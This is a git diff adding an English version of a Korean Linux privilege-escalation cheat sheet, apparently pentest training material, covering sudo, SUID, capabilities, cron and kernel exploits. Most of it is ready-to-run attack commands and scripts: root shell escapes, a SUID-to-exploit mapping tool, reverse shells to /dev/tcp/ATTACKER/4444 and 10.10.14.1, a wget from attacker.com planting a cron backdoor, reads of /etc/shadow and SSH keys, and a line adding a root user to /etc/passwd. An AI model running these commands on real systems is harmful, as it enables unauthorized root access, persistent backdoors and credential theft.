@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # Linux 권한 상승 — sudo·SUID·Capabilities·커널 익스플로잇
 
 ## 1. 권한 상승 체크리스트
@@ -300,3 +306,310 @@ if __name__ == "__main__":
 | `GTFOBins` | SUID/sudo 바이너리 악용 DB |
 | `pspy` | 프로세스 감시 (cron 탐지) |
 | `linenum.sh` | 권한 상승 체크리스트 |
+
+---
+
+<a name="english"></a>
+
+# Linux Privilege Escalation — sudo · SUID · Capabilities · Kernel Exploits
+
+## 1. Privilege Escalation Checklist
+
+```bash
+# LinPEAS automated enumeration (top priority)
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+# Manual enumeration order
+whoami && id                              # Current privileges
+cat /etc/passwd | grep sh$               # Login-capable users
+sudo -l                                  # Allowed sudo commands
+find / -perm -4000 -type f 2>/dev/null   # SUID files
+find / -perm -2000 -type f 2>/dev/null   # SGID files
+getcap -r / 2>/dev/null                  # Capabilities
+cat /etc/crontab; ls /etc/cron*          # Cron jobs
+ss -tlnp; netstat -tlnp                  # Internal listening ports
+uname -r; cat /etc/*release              # Kernel version
+```
+
+---
+
+## 2. sudo Abuse
+
+### 2.1 GTFOBins-Based
+
+```bash
+# Example sudo -l output
+# (ALL) NOPASSWD: /usr/bin/vim
+sudo vim -c ':!/bin/bash'
+sudo vim -c ':py3 import os; os.execl("/bin/bash","bash","-p")'
+
+# awk
+sudo awk 'BEGIN {system("/bin/bash")}'
+
+# find
+sudo find / -exec /bin/bash -p \; -quit
+
+# python3
+sudo python3 -c 'import os; os.system("/bin/bash")'
+
+# wget — add cron entry via file write
+sudo wget http://attacker.com/evil -O /etc/cron.d/backdoor
+
+# apt-get
+sudo apt-get changelog apt  # then type !bash
+```
+
+### 2.2 sudo Version Vulnerabilities
+
+```bash
+# CVE-2021-3156 — sudo heap overflow (sudo < 1.9.5p2)
+sudoedit -s '\' $(python3 -c 'print("A"*65536)')
+# Exploit: https://github.com/blasty/CVE-2021-3156
+
+# CVE-2019-14287 — sudo -u#-1 (sudo < 1.8.28)
+sudo -u#-1 /bin/bash
+```
+
+---
+
+## 3. SUID Binary Abuse
+
+```python
+#!/usr/bin/env python3
+"""Automated SUID/SGID binary analysis — GTFOBins matching CLI."""
+
+import argparse
+import os
+import stat
+import subprocess
+from pathlib import Path
+
+
+GTFOBINS_SUID = {
+    "bash": "bash -p",
+    "vim": "vim -c ':!/bin/bash -p'",
+    "python3": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
+    "perl": "perl -e 'use POSIX (setuid); setuid(0); exec \"/bin/bash -p\"'",
+    "find": "find / -exec /bin/bash -p \\; -quit",
+    "nmap": "nmap --interactive  # (older versions)",
+    "cp": "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; /tmp/bash -p",
+    "tee": "echo 'user:$(python3 -c \"import crypt; print(crypt.crypt(\\\"pass\\\"))\"):0:0:root:/root:/bin/bash' | tee -a /etc/passwd",
+    "awk": "awk 'BEGIN {system(\"/bin/bash -p\")}'",
+    "less": "less /etc/passwd  # then type !bash -p",
+    "more": "more /etc/passwd  # then type !bash -p",
+    "dd": "echo '#!/bin/bash\\nbash -i >& /dev/tcp/ATTACKER/4444 0>&1' | dd of=/etc/cron.d/backdoor",
+    "nano": "nano  # then ^R^X, reset; sh 1>&0 2>&0",
+    "cat": "LFILE=/etc/shadow; cat $LFILE",
+    "curl": "curl file:///etc/shadow",
+}
+
+
+def find_suid_files(search_path: str = "/") -> list[Path]:
+    suid_files = []
+    for root, dirs, files in os.walk(search_path, onerror=lambda e: None):
+        dirs[:] = [d for d in dirs if d not in {"proc", "sys", "dev"}]
+        for fname in files:
+            fpath = Path(root) / fname
+            try:
+                mode = fpath.stat().st_mode
+                if mode & stat.S_ISUID:
+                    suid_files.append(fpath)
+            except (PermissionError, OSError):
+                pass
+    return suid_files
+
+
+def analyze_suid(suid_files: list[Path]) -> list[dict]:
+    results = []
+    for fpath in suid_files:
+        name = fpath.name
+        exploit = GTFOBINS_SUID.get(name)
+        results.append({
+            "path": str(fpath),
+            "name": name,
+            "known_exploit": bool(exploit),
+            "exploit_cmd": exploit or "Not found — check GTFOBins directly",
+        })
+    return results
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="SUID binary analysis")
+    parser.add_argument("--path", default="/", help="Search path")
+    parser.add_argument("--exploitable-only", action="store_true")
+    args = parser.parse_args()
+
+    print(f"[*] Searching for SUID files in: {args.path}")
+    suid_files = find_suid_files(args.path)
+    results = analyze_suid(suid_files)
+
+    if args.exploitable_only:
+        results = [r for r in results if r["known_exploit"]]
+
+    print(f"\nFound {len(suid_files)} / Exploitable {sum(r['known_exploit'] for r in results)}\n")
+    for r in results:
+        icon = "[!]" if r["known_exploit"] else "[ ]"
+        print(f"{icon} {r['path']}")
+        if r["known_exploit"]:
+            print(f"    → {r['exploit_cmd']}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 4. Capabilities Abuse
+
+```bash
+# Enumerate capabilities
+getcap -r / 2>/dev/null
+
+# Dangerous capabilities
+# cap_setuid+ep  — can call setuid()
+python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
+
+# cap_net_raw+ep — raw sockets (packet sniffing)
+tcpdump -i any -w /tmp/capture.pcap
+
+# cap_dac_read_search+ep — bypass file read permissions
+./tar cf /dev/null /root/.ssh/id_rsa  # read succeeds
+
+# cap_fowner+ep — bypass file ownership checks
+chmod 777 /etc/shadow
+```
+
+---
+
+## 5. Cron Job Abuse
+
+```bash
+# Check if cron files are writable
+ls -la /etc/cron* /var/spool/cron/
+
+# Add reverse shell if cron.d is writable
+echo '* * * * * root bash -i >& /dev/tcp/10.10.14.1/4444 0>&1' \
+  > /etc/cron.d/backdoor
+
+# PATH manipulation — when cron scripts execute with relative paths
+cat /etc/crontab  # check PATH
+echo '#!/bin/bash' > /usr/local/bin/vulnerable_script
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/vulnerable_script
+chmod +x /usr/local/bin/vulnerable_script
+
+# Wildcard injection — when cron uses tar *
+touch /var/backup/--checkpoint=1
+touch /var/backup/--checkpoint-action=exec=sh\ shell.sh
+```
+
+---
+
+## 6. Kernel Exploits
+
+```bash
+# Check kernel version
+uname -r
+cat /proc/version
+
+# Check for vulnerable kernel versions
+# CVE-2022-0847 (DirtyPipe) — Linux 5.8~5.16.11
+python3 dirtypipe.py /etc/passwd  # adds root shell to /etc/passwd
+
+# CVE-2021-4034 (PwnKit) — pkexec < 0.120
+./PwnKit  # static binary without GLIBC dependency
+
+# CVE-2016-5195 (DirtyCow) — Linux < 4.8.3
+./dcow /etc/passwd
+
+# Automated kernel exploit search
+./linux-exploit-suggester.sh
+./linux-exploit-suggester-2.py
+```
+
+```python
+#!/usr/bin/env python3
+"""Automated Linux privilege escalation check CLI."""
+
+import argparse
+import os
+import subprocess
+import re
+from pathlib import Path
+
+
+def check_sudo_permissions() -> list[str]:
+    try:
+        result = subprocess.run(
+            ["sudo", "-l"], capture_output=True, text=True, timeout=5
+        )
+        return result.stdout.splitlines()
+    except Exception:
+        return []
+
+
+def check_writable_paths() -> list[str]:
+    dangerous_paths = [
+        "/etc/cron.d", "/etc/crontab", "/etc/cron.hourly",
+        "/etc/passwd", "/etc/shadow", "/etc/sudoers",
+        "/var/spool/cron", "/tmp",
+    ]
+    writable = []
+    for path in dangerous_paths:
+        if os.access(path, os.W_OK):
+            writable.append(path)
+    return writable
+
+
+def check_env_variables() -> dict:
+    interesting = {}
+    for key, val in os.environ.items():
+        if any(k in key.upper() for k in ["PATH", "LD_", "PYTHONPATH", "HOME"]):
+            interesting[key] = val
+    return interesting
+
+
+def get_kernel_version() -> str:
+    result = subprocess.run(["uname", "-r"], capture_output=True, text=True)
+    return result.stdout.strip()
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="Automated Linux privilege escalation check")
+    parser.add_argument("--all", action="store_true", help="Run all checks")
+    args = parser.parse_args()
+
+    print(f"[*] Current user: {os.getenv('USER', 'unknown')} (UID={os.getuid()})")
+    print(f"[*] Kernel version: {get_kernel_version()}")
+
+    print("\n[*] Checking sudo permissions...")
+    sudo_perms = check_sudo_permissions()
+    for line in sudo_perms:
+        if "NOPASSWD" in line or "ALL" in line:
+            print(f"  [!] {line.strip()}")
+
+    print("\n[*] Writable sensitive paths...")
+    writable = check_writable_paths()
+    for path in writable:
+        print(f"  [!] {path}")
+
+    print("\n[*] Environment variables...")
+    for k, v in check_env_variables().items():
+        print(f"  {k}={v}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 7. Reference Tools
+
+| Tool | Purpose |
+|------|---------|
+| `LinPEAS` | Automated enumeration and privilege escalation vector discovery |
+| `linux-exploit-suggester` | Kernel vulnerability suggestions |
+| `GTFOBins` | SUID/sudo binary abuse database |
+| `pspy` | Process monitoring (cron detection) |
+| `linenum.sh` | Privilege escalation checklist |
